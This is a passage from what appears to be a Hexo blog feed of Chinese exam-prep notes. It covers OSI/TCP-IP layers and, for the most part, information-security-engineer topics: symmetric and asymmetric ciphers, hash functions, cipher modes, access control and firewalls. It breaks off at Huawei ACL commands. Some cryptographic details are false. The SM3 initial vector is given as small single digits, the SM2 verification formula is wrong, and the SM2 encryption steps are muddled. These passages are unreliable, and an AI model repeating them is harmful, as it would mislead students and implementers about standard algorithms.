</li>
<li>服务与协议的区别<ul>
<li>协议是水平的，服务是垂直的</li>
<li>只有本层协议实现才能向上层提供服务</li>
<li>下层协议对上层服务用户透明</li>
</ul>
</li>
<li>服务分类<ul>
<li>面向连接服务与无连接服务<ul>
<li>面向连接服务<ul>
<li>三个阶段：连接建立、数据传输、连接释放</li>
</ul>
</li>
<li>无连接服务<ul>
<li>直接发送数据包</li>
</ul>
</li>
</ul>
</li>
<li>可靠服务和不可靠服务<ul>
<li>可靠服务<ul>
<li>具有纠错、检错、应答机制</li>
</ul>
</li>
<li>不可靠服务<ul>
<li>尽力而为的服务</li>
</ul>
</li>
</ul>
</li>
<li>有应答服务和无应答服务<ul>
<li>有应答服务<ul>
<li>传输系统内部自动实现应答</li>
</ul>
</li>
<li>无应答服务<ul>
<li>需要应答由高层实现</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-2-3-ISO-OSI-参考模型和TCP-IP模-型"><a href="#1-2-3-ISO-OSI-参考模型和TCP-IP模-型" class="headerlink" title="1.2.3   ISO&#x2F;OSI 参考模型和TCP&#x2F;IP模 型"></a>1.2.3   ISO&#x2F;OSI 参考模型和TCP&#x2F;IP模 型</h3><ul>
<li>OSI 参考模型<ul>
<li>层次结构<ul>
<li>物理层<ul>
<li>传输单位:比特</li>
<li>功能:透明传输原始比特流</li>
<li>研究内容<ul>
<li>电路接口参数</li>
<li>信号意义和电气特征</li>
</ul>
</li>
</ul>
</li>
<li>数据链路层<ul>
<li>传输单位:帧</li>
<li>功能<ul>
<li>差错控制</li>
<li>流量控制</li>
<li>广播信道访问控制</li>
</ul>
</li>
</ul>
</li>
<li>网络层<ul>
<li>传输单位:数据报</li>
<li>功能<ul>
<li>路由选择</li>
<li>流量控制</li>
<li>拥塞控制</li>
<li>差错控制</li>
<li>网际互联</li>
</ul>
</li>
</ul>
</li>
<li>传输层<ul>
<li>传输单位:报文段&#x2F;用户数据报</li>
<li>功能<ul>
<li>端到端通信</li>
<li>流量控制</li>
<li>差错控制</li>
<li>连接管理</li>
</ul>
</li>
</ul>
</li>
<li>会话层<ul>
<li>功能<ul>
<li>建立&#x2F;管理&#x2F;终止会话</li>
<li>同步机制</li>
</ul>
</li>
</ul>
</li>
<li>表示层<ul>
<li>功能<ul>
<li>数据表示转换</li>
<li>数据压缩</li>
<li>加密解密</li>
</ul>
</li>
</ul>
</li>
<li>应用层<ul>
<li>功能:用户与网络接口</li>
<li>协议:多种应用协议</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>TCP&#x2F;IP 模型<ul>
<li>层次结构<ul>
<li>网络接口层<ul>
<li>对应OSI:物理层+数据链路层</li>
</ul>
</li>
<li>网际层<ul>
<li>核心协议:IP</li>
<li>功能:分组路由选择</li>
</ul>
</li>
<li>传输层<ul>
<li>协议<ul>
<li>TCP:面向连接可靠传输</li>
<li>UDP:无连接不可靠传输</li>
</ul>
</li>
</ul>
</li>
<li>应用层<ul>
<li>协议<ul>
<li>Telnet</li>
<li>FTP</li>
<li>DNS</li>
<li>SMTP</li>
<li>HTTP</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>TCP&#x2F;IP模型与OSI参考模型比较<ul>
<li>相似之处<ul>
<li>分层体系结构</li>
<li>独立协议栈</li>
<li>解决异构网络互联</li>
</ul>
</li>
<li>差异<ul>
<li>概念区分<ul>
<li>OSI明确区分服务&#x2F;协议&#x2F;接口</li>
<li>TCP&#x2F;IP未明确区分</li>
</ul>
</li>
<li>层次数量<ul>
<li>OSI:7层</li>
<li>TCP&#x2F;IP:4层</li>
</ul>
</li>
<li>设计顺序<ul>
<li>OSI:先模型后协议</li>
<li>TCP&#x2F;IP:先协议后模型</li>
</ul>
</li>
<li>通信模式<ul>
<li>OSI网络层:无连接+面向连接</li>
<li>TCP&#x2F;IP网际层:仅无连接</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算机体系架构</tag>
      </tags>
  </entry>
  <entry>
    <title>软考(信息安全工程师)</title>
    <url>/2025/11/08/%E8%BD%AF%E8%80%83(%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88)/</url>
    <content><![CDATA[<h2 id="一、信息安全基础概念"><a href="#一、信息安全基础概念" class="headerlink" title="一、信息安全基础概念"></a>一、信息安全基础概念</h2><h3 id="1-信息安全基本属性"><a href="#1-信息安全基本属性" class="headerlink" title="1. 信息安全基本属性"></a>1. 信息安全基本属性</h3><ul>
<li><strong>机密性</strong>：确保信息不泄露给未授权的个体、进程或实体</li>
<li><strong>完整性</strong>：保护数据和系统的准确性和完备性，防止未授权篡改</li>
<li><strong>可用性</strong>：确保授权用户在需要时可以正常访问和使用资源</li>
<li><strong>可控性</strong>：对信息传播及内容具有控制能力</li>
<li><strong>抗抵赖性</strong>：确保行为发起者无法否认其行为（如发送消息、签署文件）</li>
</ul>
<h3 id="2-网络信息安全基本功能"><a href="#2-网络信息安全基本功能" class="headerlink" title="2. 网络信息安全基本功能"></a>2. 网络信息安全基本功能</h3><ul>
<li><strong>防御</strong>：事前采取的安全措施（防火墙、加密、访问控制）</li>
<li><strong>检测</strong>：事中或持续性的监控（IDS、态势感知）</li>
<li><strong>应急</strong>：事件发生后的紧急响应措施</li>
<li><strong>恢复</strong>：将受影响系统恢复到正常状态</li>
</ul>
<h3 id="3-信息安全管理流程"><a href="#3-信息安全管理流程" class="headerlink" title="3. 信息安全管理流程"></a>3. 信息安全管理流程</h3><ol>
<li>确定管理对象</li>
<li>评估对象价值</li>
<li>识别对象威胁</li>
<li>识别对象脆弱性</li>
<li>确定对象风险级别</li>
<li>制定防范措施</li>
<li>实施和落实防范措施</li>
<li>运行与维护网络信息安全管理设备</li>
</ol>
<h3 id="4-国家网络安全体系"><a href="#4-国家网络安全体系" class="headerlink" title="4. 国家网络安全体系"></a>4. 国家网络安全体系</h3><ul>
<li><strong>中国网络安全审查技术与认证中心(CCRC)</strong>：负责网络安全设备审查</li>
<li><strong>入网许可证</strong>：由工信部下属实验室（泰尔实验室、威尔实验室）认证</li>
<li><strong>无线产品核准</strong>：由国家无线电管理委员会负责</li>
<li><strong>网络安全等级保护制度</strong>：<ul>
<li>工作流程：定级→备案→建设整改→等级测评→运营维护</li>
<li>等级划分：1-5级（从用户自主保护级到访问验证保护级）</li>
</ul>
</li>
<li><strong>国家计算机网络应急技术处理协调中心(CNCERT&#x2F;CC)</strong>：负责网络安全事件应急处理</li>
<li><strong>四大顶级安全会议</strong>：S&amp;P、CCS、NDSS、USENIX Security</li>
</ul>
<h3 id="5-网络安全组织结构"><a href="#5-网络安全组织结构" class="headerlink" title="5. 网络安全组织结构"></a>5. 网络安全组织结构</h3><h4 id="领导层："><a href="#领导层：" class="headerlink" title="领导层："></a><strong>领导层</strong>：</h4><ul>
<li><strong>职责</strong>：确定网络安全战略方向，分配资源，对网络安全工作负责</li>
<li><strong>组成</strong>：企业高层管理者、网络安全委员会等</li>
<li><strong>关键任务</strong>：<ul>
<li>批准网络安全政策和战略</li>
<li>分配足够的预算和人力资源</li>
<li>监督网络安全工作的执行</li>
<li>对重大网络安全事件做出决策</li>
</ul>
</li>
</ul>
<h4 id="管理层："><a href="#管理层：" class="headerlink" title="管理层："></a><strong>管理层</strong>：</h4><ul>
<li><strong>职责</strong>：制定网络安全策略、标准和流程，负责安全管理团队的组织和管理</li>
<li><strong>组成</strong>：安全总监、安全经理等</li>
<li><strong>关键任务</strong>：<ul>
<li>制定和更新网络安全政策</li>
<li>规划安全投资和资源分配</li>
<li>监督安全实施进度</li>
<li>组织安全培训和意识提升活动</li>
<li>评估安全风险和应对措施</li>
</ul>
</li>
</ul>
<h4 id="执行层："><a href="#执行层：" class="headerlink" title="执行层："></a><strong>执行层</strong>：</h4><ul>
<li><strong>职责</strong>：负责安全策略的具体实施和日常操作</li>
<li><strong>组成</strong>：安全技术实施团队、安全运维团队、安全分析团队等</li>
<li><strong>关键任务</strong>：<ul>
<li>安全设备配置与维护</li>
<li>安全监控与事件响应</li>
<li>漏洞扫描与修复</li>
<li>安全策略实施与验证</li>
<li>安全报告编制</li>
</ul>
</li>
</ul>
<h4 id="外部协作层："><a href="#外部协作层：" class="headerlink" title="外部协作层："></a><strong>外部协作层</strong>：</h4><ul>
<li><strong>职责</strong>：与外部安全组织、合作伙伴、监管机构的协作</li>
<li><strong>组成</strong>：与CNCERT、安全厂商、行业联盟等的协作机制</li>
<li><strong>关键任务</strong>：<ul>
<li>安全信息共享与情报交换</li>
<li>与监管机构的合规对接</li>
<li>参与行业安全标准制定</li>
<li>与合作伙伴的安全协作</li>
<li>安全事件的跨组织响应</li>
</ul>
</li>
</ul>
<h2 id="二、密码学与加密算法"><a href="#二、密码学与加密算法" class="headerlink" title="二、密码学与加密算法"></a>二、密码学与加密算法</h2><h3 id="1-对称加密算法"><a href="#1-对称加密算法" class="headerlink" title="1. 对称加密算法"></a>1. 对称加密算法</h3><h4 id="DES加密算法详细过程"><a href="#DES加密算法详细过程" class="headerlink" title="DES加密算法详细过程"></a>DES加密算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>密钥长度：64位（实际有效56位，8位用于奇偶校验）</li>
<li>分组长度：64位</li>
<li>轮数：16轮</li>
</ul>
<p><strong>加密过程</strong>：</p>
<ol>
<li><strong>初始置换(IP)</strong>：64位明文经过初始置换表重新排列</li>
<li><strong>16轮迭代</strong>：<ul>
<li>每轮将64位数据分为左右32位</li>
<li>右半部分通过扩展置换(48位)→与子密钥异或→S盒压缩(32位)→P盒置换</li>
<li>将S盒输出与左半部分异或，作为下一轮的右半部分</li>
<li>当前右半部分直接作为下一轮的左半部分</li>
<li>每轮使用的子密钥由主密钥经过置换选择1、循环移位和置换选择2生成</li>
</ul>
</li>
<li><strong>逆初始置换(IP⁻¹)</strong>：16轮结束后，左右32位合并，经过逆初始置换得到密文</li>
</ol>
<p><strong>S盒工作原理</strong>：</p>
<ul>
<li>8个S盒，每个S盒接收6位输入，输出4位</li>
<li>6位输入的第1位和第6位组成行号，中间4位组成列号</li>
<li>从S盒中查表得到4位输出</li>
</ul>
<p><strong>密钥生成过程</strong>：</p>
<ol>
<li>64位密钥经过置换选择1，去除8位校验位，得到56位密钥</li>
<li>将56位密钥分为两部分，每部分28位</li>
<li>每轮进行循环左移（移位数根据轮数变化）</li>
<li>经过置换选择2得到48位子密钥</li>
<li>16轮共生成16个不同的48位子密钥</li>
</ol>
<h4 id="AES加密算法详细过程"><a href="#AES加密算法详细过程" class="headerlink" title="AES加密算法详细过程"></a>AES加密算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>密钥长度：128&#x2F;192&#x2F;256位</li>
<li>分组长度：128位</li>
<li>轮数：10&#x2F;12&#x2F;14轮（对应128&#x2F;192&#x2F;256位密钥）</li>
</ul>
<p><strong>加密过程</strong>：</p>
<ol>
<li><strong>初始轮密钥加</strong>：明文与第一轮密钥进行异或</li>
<li><strong>主轮函数</strong>（9&#x2F;11&#x2F;13轮）：<ul>
<li><strong>字节代换(SubBytes)</strong>：使用S盒对每个字节进行非线性替换</li>
<li><strong>行移位(ShiftRows)</strong>：每行按不同偏移量循环移位</li>
<li><strong>列混合(MixColumns)</strong>：对列进行线性变换，实现扩散</li>
<li><strong>轮密钥加(AddRoundKey)</strong>：与当前轮密钥异或</li>
</ul>
</li>
<li><strong>最终轮</strong>：与主轮类似，但省略列混合步骤</li>
</ol>
<p><strong>密钥扩展</strong>：</p>
<ul>
<li>128位密钥扩展为44个32位字(176字节)</li>
<li>扩展规则：W[i] &#x3D; W[i-4] ⊕ T(W[i-1])（当i mod 4 &#x3D; 0时）</li>
<li>T函数包括：字节代换、行移位、与轮常量异或</li>
</ul>
<p><strong>S盒构造</strong>：</p>
<ul>
<li>通过有限域GF(2⁸)上的乘法逆元运算构建</li>
<li>再经过仿射变换得到最终S盒</li>
</ul>
<h4 id="SM4对称加密算法详细过程"><a href="#SM4对称加密算法详细过程" class="headerlink" title="SM4对称加密算法详细过程"></a>SM4对称加密算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>密钥长度：128位</li>
<li>分组长度：128位</li>
<li>轮数：32轮</li>
</ul>
<p><strong>加密过程</strong>：</p>
<ol>
<li><p><strong>密钥扩展</strong>：</p>
<ul>
<li>128位加密密钥经密钥扩展算法生成32轮轮密钥</li>
<li>扩展过程：MK（主密钥）+ FK（固定参数）→ 32轮轮密钥</li>
</ul>
</li>
<li><p><strong>32轮迭代</strong>：</p>
<ul>
<li>将128位明文分为4个32位字(X₀, X₁, X₂, X₃)</li>
<li>每轮计算：Xᵢ₊₄ &#x3D; Xᵢ ⊕ T(Xᵢ₊₁ ⊕ Xᵢ₊₂ ⊕ Xᵢ₊₃ ⊕ RKᵢ)</li>
<li>T变换包括：S盒代换、线性变换</li>
</ul>
</li>
<li><p><strong>反向输出</strong>：32轮后，将最后4个字反向组合成密文</p>
</li>
</ol>
<p><strong>T变换</strong>：</p>
<ul>
<li>非线性部分：S盒代换，由4个8×8的S盒组成</li>
<li>线性部分：L变换，执行8次移位和异或操作</li>
</ul>
<h4 id="RC4流密码详细过程"><a href="#RC4流密码详细过程" class="headerlink" title="RC4流密码详细过程"></a>RC4流密码详细过程</h4><p><strong>初始化</strong>：</p>
<ol>
<li>创建256字节的S盒，并初始化为0-255</li>
<li>使用密钥填充256字节的临时数组T</li>
<li>用密钥对S盒进行初始置换</li>
</ol>
<p><strong>密钥流生成</strong>：</p>
<ol>
<li>i&#x3D;0, j&#x3D;0</li>
<li>i &#x3D; (i + 1) mod 256</li>
<li>j &#x3D; (j + S[i]) mod 256</li>
<li>交换S[i]和S[j]</li>
<li>t &#x3D; (S[i] + S[j]) mod 256</li>
<li>K &#x3D; S[t]，作为密钥流字节</li>
</ol>
<p><strong>加密</strong>：明文字节与密钥流字节进行异或得到密文</p>
<h3 id="2-非对称加密算法"><a href="#2-非对称加密算法" class="headerlink" title="2. 非对称加密算法"></a>2. 非对称加密算法</h3><h4 id="RSA算法详细过程"><a href="#RSA算法详细过程" class="headerlink" title="RSA算法详细过程"></a>RSA算法详细过程</h4><p><strong>密钥生成</strong>：</p>
<ol>
<li>随机选择两个大素数p和q（通常为1024位以上）</li>
<li>计算n &#x3D; p × q</li>
<li>计算欧拉函数φ(n) &#x3D; (p-1)(q-1)</li>
<li>选择整数e（1 &lt; e &lt; φ(n)），使得gcd(e, φ(n)) &#x3D; 1</li>
<li>计算d，使得d × e ≡ 1 (mod φ(n))</li>
<li>公钥：(e, n)，私钥：(d, n)</li>
</ol>
<p><strong>加密过程</strong>：</p>
<ol>
<li>将明文M转换为整数（M &lt; n）</li>
<li>计算密文C &#x3D; Mᵉ mod n</li>
</ol>
<p><strong>解密过程</strong>：</p>
<ol>
<li>计算明文M &#x3D; Cᵈ mod n</li>
</ol>
<p><strong>实际应用中的填充方案</strong>：</p>
<ul>
<li>PKCS#1 v1.5：添加固定格式的填充</li>
<li>OAEP（最优非对称加密填充）：使用随机数和哈希函数进行填充</li>
</ul>
<h4 id="SM2椭圆曲线密码算法详细过程"><a href="#SM2椭圆曲线密码算法详细过程" class="headerlink" title="SM2椭圆曲线密码算法详细过程"></a>SM2椭圆曲线密码算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>素数域p</li>
<li>椭圆曲线方程：y² &#x3D; x³ + ax + b (mod p)</li>
<li>基点G（阶为n的点）</li>
<li>私钥d（1 &lt; d &lt; n-1）</li>
<li>公钥P &#x3D; dG</li>
</ul>
<p><strong>密钥生成</strong>：</p>
<ol>
<li>随机选择私钥d ∈ [1, n-1]</li>
<li>计算公钥P &#x3D; dG</li>
</ol>
<p><strong>加密过程</strong>：</p>
<ol>
<li>选择随机数k ∈ [1, n-1]</li>
<li>计算C₁ &#x3D; kG &#x3D; (x₁, y₁)</li>
<li>计算t &#x3D; kP &#x3D; (x₂, y₂)</li>
<li>计算E &#x3D; h(x₂||y₂) ⊕ M（h为哈希函数）</li>
<li>计算C₂ &#x3D; SM3(x₂||M||y₂)</li>
<li>密文为(C₁, C₂, E)</li>
</ol>
<p><strong>解密过程</strong>：</p>
<ol>
<li>从C₁恢复t &#x3D; dC₁</li>
<li>从E恢复M &#x3D; h(x₂||y₂) ⊕ E</li>
<li>验证C₂ &#x3D; SM3(x₂||M||y₂)</li>
</ol>
<p><strong>签名过程</strong>：</p>
<ol>
<li>计算e &#x3D; SM3(Z || M)，其中Z为用户身份标识</li>
<li>选择随机数k ∈ [1, n-1]</li>
<li>计算(x₁, y₁) &#x3D; kG</li>
<li>计算r &#x3D; (e + x₁) mod n</li>
<li>计算s &#x3D; (1 + d)⁻¹(k - rd) mod n</li>
<li>签名为(r, s)</li>
</ol>
<p><strong>验证过程</strong>：</p>
<ol>
<li>验证r, s ∈ [1, n-1]</li>
<li>计算e &#x3D; SM3(Z || M)</li>
<li>计算R &#x3D; sG + (s + e)P</li>
<li>验证r &#x3D; (e + x_R) mod n</li>
</ol>
<h4 id="ECC（椭圆曲线密码学）基本原理"><a href="#ECC（椭圆曲线密码学）基本原理" class="headerlink" title="ECC（椭圆曲线密码学）基本原理"></a>ECC（椭圆曲线密码学）基本原理</h4><p><strong>椭圆曲线加法</strong>：</p>
<ul>
<li>点加：P + Q &#x3D; R</li>
<li>点倍：2P &#x3D; P + P</li>
<li>无穷远点O作为加法单位元</li>
</ul>
<p><strong>有限域上的椭圆曲线</strong>：</p>
<ul>
<li>素数域：y² &#x3D; x³ + ax + b (mod p)</li>
<li>二进制域：y² + xy &#x3D; x³ + ax² + b (mod 2^m)</li>
</ul>
<p><strong>ECC安全性基础</strong>：</p>
<ul>
<li>椭圆曲线离散对数问题（ECDLP）</li>
<li>给定点P和Q &#x3D; kP，求k在计算上是困难的</li>
</ul>
<h3 id="3-哈希算法"><a href="#3-哈希算法" class="headerlink" title="3. 哈希算法"></a>3. 哈希算法</h3><h4 id="MD5算法详细过程"><a href="#MD5算法详细过程" class="headerlink" title="MD5算法详细过程"></a>MD5算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>输出长度：128位</li>
<li>分组长度：512位</li>
<li>轮数：4轮（每轮16步）</li>
</ul>
<p><strong>处理过程</strong>：</p>
<ol>
<li><strong>填充</strong>：添加1后跟0，使长度≡448 mod 512</li>
<li><strong>添加长度</strong>：附加64位原始消息长度</li>
<li><strong>初始化MD缓冲区</strong>：A&#x3D;0x67452301, B&#x3D;0xEFCDAB89, C&#x3D;0x98BADCFE, D&#x3D;0x10325476</li>
<li><strong>处理512位分组</strong>：<ul>
<li>将分组分为16个32位字</li>
<li>4轮处理，每轮16步</li>
<li>每步使用不同的非线性函数F和常数T</li>
<li>步骤：a &#x3D; b + ((a + F(b,c,d) + X[k] + T[i]) &lt;&lt;&lt; s)</li>
</ul>
</li>
</ol>
<p><strong>非线性函数</strong>：</p>
<ul>
<li>第1轮：F &#x3D; (b &amp; c) | ((~b) &amp; d)</li>
<li>第2轮：F &#x3D; (b &amp; d) | (c &amp; (~d))</li>
<li>第3轮：F &#x3D; b ^ c ^ d</li>
<li>第4轮：F &#x3D; c ^ (b | (~d))</li>
</ul>
<h4 id="SHA-1算法详细过程"><a href="#SHA-1算法详细过程" class="headerlink" title="SHA-1算法详细过程"></a>SHA-1算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>输出长度：160位</li>
<li>分组长度：512位</li>
<li>轮数：80步</li>
</ul>
<p><strong>处理过程</strong>：</p>
<ol>
<li><strong>填充</strong>：添加1后跟0，使长度≡448 mod 512</li>
<li><strong>添加长度</strong>：附加64位原始消息长度</li>
<li><strong>初始化</strong>：h₀&#x3D;0x67452301, h₁&#x3D;0xEFCDAB89, h₂&#x3D;0x98BADCFE, h₃&#x3D;0x10325476, h₄&#x3D;0xC3D2E1F0</li>
<li><strong>处理512位分组</strong>：<ul>
<li>将分组分为16个32位字W₀-W₁₅</li>
<li>扩展为80个字：Wt &#x3D; (Wt-3 ⊕ Wt-8 ⊕ Wt-14 ⊕ Wt-16) &lt;&lt;&lt; 1</li>
<li>80步处理，每步更新五个工作变量a,b,c,d,e</li>
<li>步骤：TEMP &#x3D; (a &lt;&lt;&lt; 5) + f(b,c,d) + e + Wt + Kt</li>
<li>更新：e&#x3D;d, d&#x3D;c, c&#x3D;b&lt;&lt;&lt;30, b&#x3D;a, a&#x3D;TEMP</li>
</ul>
</li>
</ol>
<p><strong>非线性函数与常数</strong>：</p>
<ul>
<li>0-19步：f &#x3D; (b &amp; c) | ((~b) &amp; d), K&#x3D;0x5A827999</li>
<li>20-39步：f &#x3D; b ^ c ^ d, K&#x3D;0x6ED9EBA1</li>
<li>40-59步：f &#x3D; (b &amp; c) | (b &amp; d) | (c &amp; d), K&#x3D;0x8F1BBCDC</li>
<li>60-79步：f &#x3D; b ^ c ^ d, K&#x3D;0xCA62C1D6</li>
</ul>
<h4 id="SM3哈希算法详细过程"><a href="#SM3哈希算法详细过程" class="headerlink" title="SM3哈希算法详细过程"></a>SM3哈希算法详细过程</h4><p><strong>基本参数</strong>：</p>
<ul>
<li>输出长度：256位</li>
<li>分组长度：512位</li>
<li>轮数：64轮</li>
</ul>
<p><strong>处理过程</strong>：</p>
<ol>
<li><strong>填充</strong>：添加1后跟0，使长度≡448 mod 512</li>
<li><strong>添加长度</strong>：附加64位原始消息长度</li>
<li><strong>初始化</strong>：A&#x3D;7, B&#x3D;4, C&#x3D;1, D&#x3D;2, E&#x3D;1, F&#x3D;2, G&#x3D;8, H&#x3D;8（初始向量）</li>
<li><strong>处理512位分组</strong>：<ul>
<li>将分组分为16个32位字</li>
<li>扩展为68个字：Wt &#x3D; P1(Wt-16 ⊕ Wt-9 ⊕ ROTL(Wt-3,15)) ⊕ ROTL(Wt-13,7) ⊕ Wt-6</li>
<li>64轮处理，每轮使用不同的非线性函数和常数</li>
<li>每轮更新8个32位工作变量</li>
</ul>
</li>
</ol>
<p><strong>P0、P1函数</strong>：</p>
<ul>
<li>P0(X) &#x3D; X ⊕ ROTL(X,9) ⊕ ROTL(X,17)</li>
<li>P1(X) &#x3D; X ⊕ ROTL(X,15) ⊕ ROTL(X,23)</li>
</ul>
<h3 id="4-数字签名技术"><a href="#4-数字签名技术" class="headerlink" title="4. 数字签名技术"></a>4. 数字签名技术</h3><p><strong>数字签名过程</strong>：</p>
<ol>
<li>发送方对原始数据用哈希函数（如SM3）生成摘要</li>
<li>用自己的私钥对摘要进行加密，得到数字签名</li>
<li>将原始数据和数字签名一起发送给接收方</li>
<li>接收方用发送方的公钥对签名进行解密，得到摘要A</li>
<li>接收方对收到的原始数据用同样的哈希函数生成摘要B</li>
<li>比较摘要A和摘要B，如果相同，则签名有效</li>
</ol>
<p><strong>典型数字签名算法</strong>：</p>
<ul>
<li>RSA签名：基于RSA加密算法</li>
<li>DSA：仅用于签名，不能加密</li>
<li>ECDSA：基于椭圆曲线的签名算法</li>
<li>SM2：国密算法，包含签名、密钥交换和加密功能</li>
</ul>
<h3 id="5-密码操作模式"><a href="#5-密码操作模式" class="headerlink" title="5. 密码操作模式"></a>5. 密码操作模式</h3><h4 id="ECB-电子密码本-模式"><a href="#ECB-电子密码本-模式" class="headerlink" title="ECB (电子密码本) 模式"></a>ECB (电子密码本) 模式</h4><ul>
<li><strong>工作原理</strong>：将明文分成固定长度的块，每个块独立加密</li>
<li><strong>特点</strong>：<ul>
<li>相同明文块产生相同的密文块</li>
<li>不需要初始化向量(IV)</li>
<li>容易受到模式分析攻击</li>
</ul>
</li>
<li><strong>应用场景</strong>：适合加密短消息或密钥，不适合加密大量数据</li>
<li><strong>安全风险</strong>：明文模式在密文中可见</li>
</ul>
<h4 id="CBC-密码分组链接-模式"><a href="#CBC-密码分组链接-模式" class="headerlink" title="CBC (密码分组链接) 模式"></a>CBC (密码分组链接) 模式</h4><ul>
<li><strong>工作原理</strong>：每个明文块与前一个密文块进行异或后再加密</li>
<li><strong>特点</strong>：<ul>
<li>相同明文块在不同位置产生不同密文块</li>
<li>需要初始化向量(IV)</li>
<li>错误传播：单个比特错误影响当前块和下一个块</li>
</ul>
</li>
<li><strong>应用场景</strong>：广泛用于文件加密、SSL&#x2F;TLS</li>
<li><strong>安全优势</strong>：隐藏明文模式</li>
</ul>
<h4 id="CFB-密文反馈-模式"><a href="#CFB-密文反馈-模式" class="headerlink" title="CFB (密文反馈) 模式"></a>CFB (密文反馈) 模式</h4><ul>
<li><strong>工作原理</strong>：将前一个密文块加密后与明文异或得到当前密文</li>
<li><strong>特点</strong>：<ul>
<li>可以处理流数据</li>
<li>需要初始化向量(IV)</li>
<li>错误传播：单个比特错误影响多个后续块</li>
</ul>
</li>
<li><strong>应用场景</strong>：实时数据加密，如卫星通信</li>
<li><strong>优势</strong>：可以将块加密算法转换为流加密</li>
</ul>
<h4 id="OFB-输出反馈-模式"><a href="#OFB-输出反馈-模式" class="headerlink" title="OFB (输出反馈) 模式"></a>OFB (输出反馈) 模式</h4><ul>
<li><strong>工作原理</strong>：生成一个密钥流，明文与密钥流异或得到密文</li>
<li><strong>特点</strong>：<ul>
<li>不受密文传输错误影响</li>
<li>需要初始化向量(IV)</li>
<li>相同IV和密钥会产生相同密钥流</li>
</ul>
</li>
<li><strong>应用场景</strong>：卫星通信、有噪信道</li>
<li><strong>优势</strong>：错误不会传播</li>
</ul>
<h4 id="CTR-计数器-模式"><a href="#CTR-计数器-模式" class="headerlink" title="CTR (计数器) 模式"></a>CTR (计数器) 模式</h4><ul>
<li><strong>工作原理</strong>：使用计数器生成密钥流，明文与密钥流异或</li>
<li><strong>特点</strong>：<ul>
<li>可并行处理</li>
<li>不受传输错误影响</li>
<li>需要唯一计数器值</li>
</ul>
</li>
<li><strong>应用场景</strong>：高性能要求的加密，如硬盘加密</li>
<li><strong>优势</strong>：高效，可随机访问</li>
</ul>
<h2 id="三、网络安全技术"><a href="#三、网络安全技术" class="headerlink" title="三、网络安全技术"></a>三、网络安全技术</h2><h3 id="1-网络安全体系"><a href="#1-网络安全体系" class="headerlink" title="1. 网络安全体系"></a>1. 网络安全体系</h3><p><strong>网络安全体系特征</strong>：</p>
<ul>
<li><strong>整体性</strong>：各安全组件协同工作</li>
<li><strong>协同性</strong>：不同安全措施相互配合</li>
<li><strong>过程性</strong>：安全管理是持续过程</li>
<li><strong>全面性</strong>：覆盖所有安全方面</li>
<li><strong>适应性</strong>：能够应对新的安全威胁</li>
</ul>
<h3 id="2-访问控制模型"><a href="#2-访问控制模型" class="headerlink" title="2. 访问控制模型"></a>2. 访问控制模型</h3><h4 id="自主访问控制模型-DAC"><a href="#自主访问控制模型-DAC" class="headerlink" title="自主访问控制模型(DAC)"></a>自主访问控制模型(DAC)</h4><ul>
<li><strong>特点</strong>：基于主体的访问控制</li>
<li><strong>实现方式</strong>：<ul>
<li>基于行：能力表、前缀表</li>
<li>基于列：访问控制列表(ACL)、保护位</li>
</ul>
</li>
<li><strong>特点</strong>：灵活性高，但难以统一管理</li>
</ul>
<h4 id="强制访问控制模型-MAC"><a href="#强制访问控制模型-MAC" class="headerlink" title="强制访问控制模型(MAC)"></a>强制访问控制模型(MAC)</h4><ul>
<li><strong>特点</strong>：基于安全标记的访问控制</li>
<li><strong>典型模型</strong>：<ul>
<li>BLP模型：保护信息机密性，”不上读，不下写”</li>
<li>Biba模型：保护信息完整性，”不下读，不上写”</li>
</ul>
</li>
<li><strong>实现方式</strong>：安全标签、访问矩阵</li>
</ul>
<h4 id="基于角色的访问控制模型-RBAC"><a href="#基于角色的访问控制模型-RBAC" class="headerlink" title="基于角色的访问控制模型(RBAC)"></a>基于角色的访问控制模型(RBAC)</h4><ul>
<li><strong>特点</strong>：通过角色关联权限和用户</li>
<li><strong>核心组件</strong>：<ul>
<li>用户：系统中的实体</li>
<li>角色：权限的集合</li>
<li>权限：对客体的操作权</li>
</ul>
</li>
<li><strong>优点</strong>：简化权限管理，支持最小特权原则</li>
<li><strong>特殊属性</strong>：同时具有强制访问控制和自主访问控制的属性，是当前最常用的访问控制模型</li>
</ul>
<h3 id="3-防火墙技术"><a href="#3-防火墙技术" class="headerlink" title="3. 防火墙技术"></a>3. 防火墙技术</h3><h4 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h4><ol>
<li><strong>包过滤路由器</strong>：基于IP&#x2F;TCP&#x2F;UDP头信息过滤</li>
<li><strong>双宿主机</strong>：具有两个网络接口的堡垒主机</li>
<li><strong>屏蔽主机</strong>：包过滤路由器+堡垒主机</li>
<li><strong>屏蔽子网</strong>：两个路由器+DMZ区域</li>
</ol>
<h4 id="防火墙性能指标"><a href="#防火墙性能指标" class="headerlink" title="防火墙性能指标"></a>防火墙性能指标</h4><ul>
<li>单位时间内建立的TCP连接数量</li>
<li>每秒处理的数据包数量</li>
<li>并发连接数</li>
<li>吞吐量</li>
</ul>
<h4 id="DMZ结构"><a href="#DMZ结构" class="headerlink" title="DMZ结构"></a>DMZ结构</h4><ul>
<li><strong>隔离区(DMZ)</strong>：放置对外服务的服务器</li>
<li><strong>内部网络</strong>：保护内部资源</li>
<li><strong>外部网络</strong>：互联网</li>
<li><strong>两层防火墙</strong>：外部防火墙过滤入站流量，内部防火墙过滤DMZ到内部网络流量</li>
</ul>
<h4 id="华为防火墙设置指令"><a href="#华为防火墙设置指令" class="headerlink" title="华为防火墙设置指令"></a>华为防火墙设置指令</h4><ul>
<li><p><strong>基本ACL</strong>：基于源IP地址进行过滤</p>
